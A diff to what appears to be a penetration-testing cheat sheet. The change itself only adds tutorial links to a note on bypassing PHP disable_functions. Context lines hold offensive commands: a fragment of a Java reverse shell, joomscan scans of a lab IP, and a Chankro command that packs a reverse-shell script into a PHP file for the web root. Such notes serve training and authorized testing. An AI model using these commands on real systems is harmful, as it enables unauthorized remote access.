@@ -1011,7 +1011,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 joomscan -u  http://10.11.1.111
 joomscan -u  http://10.11.1.111 --enumerate-components
 
-# PHP bypass disable_functions and open_basedir
+# PHP bypass disable_functions and open_basedir [https://www.youtube.com/watch?v=cJkEyZrmK6U&ab_channel=TechMafia] [https://tryhackme.com/r/room/bypassdisablefunctions]
 # Chankro
 https://github.com/TarlogicSecurity/Chankro
 python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
